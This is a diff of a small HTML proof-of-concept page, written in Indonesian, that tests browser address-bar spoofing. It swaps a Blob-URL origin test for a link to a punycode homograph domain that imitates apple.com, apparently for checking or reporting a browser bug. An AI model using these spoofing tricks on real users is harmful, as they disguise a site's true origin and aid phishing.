@@ -3,42 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Address Bar Spoofing - Blob Test</title>
+    <title>PoC Address Bar Spoofing - IDN Test</title>
     <style>
-        body { font-family: -apple-system, sans-serif; padding: 30px; text-align: center; background-color: #fafafa; }
-        button { background-color: #ff9500; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 10px; cursor: pointer; font-weight: bold; }
-        .info { color: #555; font-size: 14px; margin-bottom: 20px; }
+        body { font-family: -apple-system, sans-serif; padding: 30px; text-align: center; }
+        .btn-link { background-color: #34c759; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 10px; cursor: pointer; font-weight: bold; text-decoration: none; display: inline-block; }
     </style>
 </head>
 <body>
 
-    <h2>PoC Uji Coba Blob Origin</h2>
-    <p class="info">Menguji apakah browser menyembunyikan atau salah menampilkan domain asal saat memuat dokumen objek memori.</p>
+    <h2>PoC Uji Coba IDN Homograph</h2>
+    <p>Klik tautan di bawah. Jika address bar menampilkan bentuk tulisan Latin bersih (misal: <code>apple.com</code> palsu) dan bukan bentuk Punycode (<code>xn--...</code>), maka filter Homograph berstatus bypass.</p>
     
-    <button onclick="testBlobSpoof()">Buka Konten Blob</button>
-
-    <script>
-        function testBlobSpoof() {
-            // Konten tiruan yang akan disuntikkan ke dalam memori browser
-            const htmlContent = `
-                <html>
-                <head><title>Halaman Terisolasi</title></head>
-                <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
-                    <h1 style="color:red;">KONTEN DIKONTROL PENYERANG</h1>
-                    <p>Periksa Address Bar Anda sekarang.</p>
-                    <p>Jika domain github.io hilang atau berganti menjadi kosong/domain lain, bug ini valid.</p>
-                </body>
-                </html>
-            `;
-
-            // Membuat objek Blob di memori browser
-            const blob = new Blob([htmlContent], { type: 'text/html' });
-            const blobUrl = URL.createObjectURL(blob);
-
-            // Membuka blob url di tab baru
-            window.open(blobUrl, '_blank');
-        }
-    </script>
+    <a href="https://xn--pple-43d.com" target="_blank" class="btn-link">Buka Domain Tiruan</a>
 
 </body>
 </html>
